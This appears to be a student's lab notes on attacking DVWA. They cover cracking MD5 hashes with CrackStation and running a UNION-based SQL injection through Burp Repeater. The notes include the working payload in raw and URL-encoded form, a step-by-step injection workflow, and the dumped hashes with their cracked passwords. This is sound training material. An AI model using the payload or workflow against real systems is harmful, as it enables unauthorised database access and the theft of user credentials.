# Day 9 Remaining Tasks — MD5 Hash Cracking + SQLi Through Burp Repeater

---

## 1. What We Did

- Cracked all MD5 password hashes from the DVWA database dump using crackstation.net
- Performed SQL Injection through Burp Repeater instead of the browser
- Learned why URL encoding matters in Burp and how to handle it
- Saw the raw HTML response containing the full database dump

---

## 2. Cracking MD5 Hashes with CrackStation

### What is MD5
MD5 is a hashing algorithm that converts any input into a fixed 32-character hex string. It was designed for speed — which makes it terrible for passwords because attackers can crack it extremely fast.

### What is CrackStation
CrackStation.net is a free online hash cracking tool that uses a massive pre-computed rainbow table of billions of hash → password mappings. You paste a hash in and it instantly looks up the plain text password.

### What we did
Pasted all 4 unique hashes from the DVWA dump into crackstation.net and got instant results:

| Username | Hash | Cracked Password |
|---|---|---|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |

All cracked in under 2 seconds.

### Key observations
- `admin` and `smithy` have the **identical hash** → they use the same password (`password`)
- This is detectable without even cracking — identical hashes = identical passwords
- All passwords are common dictionary words — extremely weak
- MD5 provides zero real protection for passwords

### Why this matters in real bug bounty
If you dump a database and find MD5 hashes you file multiple findings:
- **Finding 1:** SQL Injection — Critical
- **Finding 2:** Weak password hashing algorithm (MD5) — High
- **Finding 3:** Weak/common passwords in use — Medium

That's 3 separate vulnerability reports from one attack chain.

### What proper password hashing looks like
| Algorithm | Safe? | Why |
|---|---|---|
| MD5 | No | Too fast, rainbow tables exist |
| SHA-1 | No | Same problem as MD5 |
| SHA-256 | Weak | Still too fast without salting |
| bcrypt | Yes | Slow by design, built-in salting |
| Argon2 | Yes | Current gold standard |

---

## 3. SQL Injection Through Burp Repeater

### Why use Burp Repeater instead of the browser
- Browser automatically URL encodes your input before sending
- Burp Repeater sends exactly what you type — you control everything
- Faster for testing multiple payloads — just edit and click Send
- You see the raw HTML response — easier to find injected data
- This is how real pentesters and bug bounty hunters work

### The URL encoding problem we hit
When modifying the `id=` parameter directly in Burp Repeater, raw spaces in SQL payloads break the request because spaces are not valid characters in a URL.

For example pasting this directly fails:
```
id=1' UNION SELECT user, password FROM users#
```
The spaces cause a malformed request and the server returns an error.

### How URL encoding works
The browser hides this from you — it encodes everything automatically. In Burp you have to handle it yourself.

| Character | URL Encoded |
|---|---|
| space | `+` or `%20` |
| `'` | `%27` |
| `,` | `%2C` |
| `#` | `%23` |
| `=` | `%3D` |

### How we solved it — Burp's built in encoder
Instead of manually encoding every character we used Burp's built in conversion:

**Step by step:**
1. Typed the payload into Repeater
2. Selected the entire value after `id=`
3. Right clicked → **Convert selection** → **URL** → **URL-encode key characters**
4. Burp automatically encoded all special characters
5. Clicked Send → worked perfectly

This is the correct workflow for real testing — always use Burp's encoder rather than manually replacing characters.

### The encoded payload
After encoding, the payload looked like this in the request:
```
id=1'+UNION+SELECT+user%2Cpassword+FROM+users%23
```
Which decodes back to:
```
id=1' UNION SELECT user,password FROM users#
```

### What the raw HTML response looked like
After clicking Send in Repeater the response panel showed the full HTML of the DVWA page. Inside the HTML we found:

```html
<pre>ID: 1' UNION SELECT user, password FROM users#
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99</pre>

<pre>ID: 1' UNION SELECT user, password FROM users#
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03</pre>

<pre>ID: 1' UNION SELECT user, password FROM users#
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b</pre>

<pre>ID: 1' UNION SELECT user, password FROM users#
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7</pre>

<pre>ID: 1' UNION SELECT user, password FROM users#
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99</pre>
```

All 5 users and their MD5 hashes visible in raw HTML. Full dump confirmed through Burp Repeater.

### How to find your data in a large HTML response
Real responses are hundreds of lines of HTML. Use **Ctrl+F** in Burp's response panel to search for:
- A known username like `admin`
- A known hash value
- Any string you expect to see in the output

This is faster than scrolling through everything manually.

---

## 4. Browser vs Burp Repeater — Full Comparison

| | Browser | Burp Repeater |
|---|---|---|
| URL encoding | Automatic | Manual or use Burp encoder |
| Speed for multiple payloads | Slow — reload every time | Fast — just edit and Send |
| What you see | Rendered page | Raw HTML response |
| Control over request | Limited | Full — change anything |
| Finding data in response | Easy — rendered visually | Use Ctrl+F in response panel |
| Used for | Quick confirmation | Deep testing and real work |

---

## 5. Key Concepts Summary

| Term | Meaning |
|---|---|
| MD5 | Fast but weak hashing algorithm — crackable in seconds |
| Rainbow table | Pre-computed database of hash → password mappings |
| CrackStation | Free online tool that looks up hashes in rainbow tables |
| Identical hashes | Mean identical passwords — detectable without cracking |
| URL encoding | Converting special chars to `%XX` format for safe transmission in URLs |
| Burp encoder | Right click → Convert selection → URL → URL-encode key characters |
| Raw HTML response | What Burp shows — the actual server response before browser renders it |
| Ctrl+F in Burp | Search inside raw response to find your injected data |

---

## 6. Full Burp Repeater SQLi Workflow

```
1. Turn Intercept ON in Burp
2. Submit normal input in browser (id=1)
3. Request freezes in Burp
4. Right click → Send to Repeater
5. Forward → Turn Intercept OFF
6. Go to Repeater tab
7. Find id= parameter in the URL
8. Type your payload after id=
9. Select the payload value
10. Right click → Convert selection → URL → URL-encode key characters
11. Click Send
12. In response panel → Ctrl+F → search for known data
13. Full dump visible in raw HTML
```

---
